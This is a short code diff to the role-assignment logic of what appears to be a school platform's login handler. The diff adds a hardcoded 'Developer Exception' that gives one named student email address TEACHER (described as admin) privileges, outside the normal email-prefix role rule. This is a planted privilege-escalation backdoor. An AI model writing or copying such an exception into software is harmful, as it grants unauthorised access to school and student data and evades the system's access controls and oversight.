@@ -503,7 +503,12 @@
 
             if (!password) return;
 
-            const role = email.startsWith('g-') ? 'TEACHER' : 'STUDENT';
+            let role = email.startsWith('g-') ? 'TEACHER' : 'STUDENT';
+            
+            // Developer Exception: Upgrade this specific student account to Admin/Teacher privileges
+            if (email === 'm-11137419@moe-dl.edu.my') {
+                role = 'TEACHER';
+            }
             
             // Extract a display name from the ID (e.g. g-12345678 -> G-12345678)
             const generatedName = email.split('@')[0].toUpperCase();
